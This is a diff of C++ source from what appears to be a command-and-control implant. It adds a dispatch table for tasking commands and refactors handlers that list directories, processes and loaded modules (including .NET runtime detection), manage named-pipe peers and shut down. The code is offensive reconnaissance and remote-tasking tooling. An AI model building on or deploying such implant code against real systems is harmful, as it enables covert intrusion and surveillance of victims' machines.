@@ -1,8 +1,17 @@
 #include <core/include/commands.hpp>
 namespace Commands {
 
+    __code_seg(".rdata") _command_map cmd_map[] = {
+        { .name = DIRECTORYLIST, 	.address = Commands::DirectoryList  },
+        { .name = PROCESSMODULES,	.address = Commands::ProcessModules },
+        { .name = PROCESSLIST,		.address = Commands::ProcessList    },
+        { .name = ADDPEER,			.address = Commands::AddPeer        },
+        { .name = REMOVEPEER,		.address = Commands::RemovePeer     },
+        { .name = SHUTDOWN,			.address = Commands::Shutdown       },
+        { .name = 0,				.address = nullptr					}
+    };
+
     VOID DirectoryList (_parser *const parser) {
-        HEXANE
 
         _stream *out = Stream::CreateTaskResponse(DIRECTORYLIST);
 
@@ -66,7 +75,6 @@ namespace Commands {
     }
 
     VOID ProcessModules (_parser *const parser) {
-        HEXANE
 
         _stream *out = Stream::CreateTaskResponse(PROCESSMODULES);
 
@@ -121,7 +129,6 @@ namespace Commands {
     }
 
     VOID ProcessList(_parser *const parser) {
-        HEXANE
 
         _stream *out = Stream::CreateTaskResponse(PROCESSLIST);
 
@@ -159,22 +166,20 @@ namespace Commands {
                 continue;
             }
 
-            if (SUCCEEDED(Ctx->nt.CLRCreateInstance(X_GUID_CLSID_CLRMetaHost, X_GUID_IID_ICLRMetaHost, R_CAST(void**, &meta)))) {
-                if (SUCCEEDED(meta->lpVtbl->EnumerateInstalledRuntimes(meta, &enums))) {
+            x_ntassert(Ctx->nt.CLRCreateInstance(X_GUID_CLSID_CLRMetaHost, X_GUID_IID_ICLRMetaHost, R_CAST(void**, &meta)));
+            x_ntassert(meta->lpVtbl->EnumerateInstalledRuntimes(meta, &enums));
 
-                    while (S_OK == enums->Next(0x1, R_CAST(IUnknown**, &runtime), nullptr)) {
-                        if (runtime->lpVtbl->IsLoaded(runtime, process, &is_loaded) == S_OK && is_loaded == TRUE) {
-                            is_managed = TRUE;
+            while (S_OK == enums->Next(0x1, R_CAST(IUnknown**, &runtime), nullptr)) {
+                if (runtime->lpVtbl->IsLoaded(runtime, process, &is_loaded) == S_OK && is_loaded == TRUE) {
+                    is_managed = TRUE;
 
-                            if (Type == MANAGED_PROCESS && SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &Size))) {
-                                Stream::PackDword(out, entries.th32ProcessID);
-                                Stream::PackString(out, entries.szExeFile);
-                                Stream::PackWString(out, buffer);
-                            }
-                        }
-                        runtime->lpVtbl->Release(runtime);
+                    if (Type == MANAGED_PROCESS && SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &Size))) {
+                        Stream::PackDword(out, entries.th32ProcessID);
+                        Stream::PackString(out, entries.szExeFile);
+                        Stream::PackWString(out, buffer);
                     }
                 }
+                runtime->lpVtbl->Release(runtime);
             }
 
             if (!is_managed && Type == UNMANAGED_PROCESS) {
@@ -196,7 +201,6 @@ namespace Commands {
     }
 
     VOID AddPeer(_parser *parser) {
-        HEXANE
 
         auto pipe_name  = Parser::UnpackWString(parser, nullptr);
         auto peer_id    = Parser::UnpackDword(parser);
@@ -205,14 +209,12 @@ namespace Commands {
     }
 
     VOID RemovePeer(_parser *parser) {
-        HEXANE
 
         auto peer_id = Parser::UnpackDword(parser);
         Clients::RemoveClient(peer_id);
     }
 
     VOID Shutdown (_parser *parser) {
-        HEXANE
 
         // Send final message
         // Zero/Free all memory
@@ -221,20 +223,17 @@ namespace Commands {
     }
 
 
-    UINT_PTR GetCommandAddress(const uint32_t name, bool* internal) {
-        HEXANE
+    UINT_PTR GetCommandAddress(const uint32_t name) {
 
         uintptr_t address = { };
-        *internal = false;
 
         for (uint32_t i = 0 ;; i++) {
-            if (!Commands::cmd_map[i].name) {
+            if (!cmd_map[i].name) {
                 return_defer(ERROR_PROC_NOT_FOUND);
             }
 
-            if (Commands::cmd_map[i].name == name) {
-                *internal = true;
-                address = U_PTR(Commands::cmd_map[i].address);
+            if (cmd_map[i].name == name) {
+                address = U_PTR(cmd_map[i].address);
             }
         }
 
